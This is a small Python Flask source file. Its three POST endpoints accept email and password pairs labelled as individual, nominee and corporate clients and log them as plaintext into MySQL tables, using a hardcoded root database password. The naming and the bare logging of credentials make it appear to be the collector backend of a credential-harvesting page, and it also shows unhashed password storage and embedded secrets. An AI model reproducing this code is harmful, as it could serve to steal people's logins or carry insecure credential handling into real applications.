from flask import Flask, request
import mysql.connector

app = Flask(__name__)

@app.route("/individualDatalog", methods=['POST'])
def individual_client_data_get():
    email = request.form['email']
    password = request.form['password']

    mydb = mysql.connector.connect(
        host="localhost",
        user="root",
        password="tu!NNel0024jenxoksi",
        database="lobusch_users_data"
    )
    mycursor = mydb.cursor()

    sql = "INSERT INTO log_users_data_individual (email, password) VALUE (%s, %s)"
    val = (email, password)
    mycursor.execute(sql, val)

    mydb.commit()
    return "<p>opereation success</p>"

@app.route("/nomineeDatalog", methods=['POST'])
def nominee_client_data_get():
    email = request.form['email']
    password = request.form['password']

    mydb = mysql.connector.connect(
        host="localhost",
        user="root",
        password="tu!NNel0024jenxoksi",
        database="lobusch_users_data"
    )
    mycursor = mydb.cursor()

    sql = "INSERT INTO log_users_data_nominee (email, password) VALUE (%s, %s)"
    val = (email, password)
    mycursor.execute(sql, val)

    mydb.commit()
    return "<p>opereation success</p>"

@app.route("/corporateDatalog", methods=['POST'])
def corporate_client_data_get():
    email = request.form['email']
    password = request.form['password']

    mydb = mysql.connector.connect(
        host="localhost",
        user="root",
        password="tu!NNel0024jenxoksi",
        database="lobusch_users_data"
    )
    mycursor = mydb.cursor()

    sql = "INSERT INTO log_users_data_corporate (email, password) VALUE (%s, %s)"
    val = (email, password)
    mycursor.execute(sql, val)

    mydb.commit()
    return "<p>opereation success</p>"



if __name__ == "__main__":
    app.run()
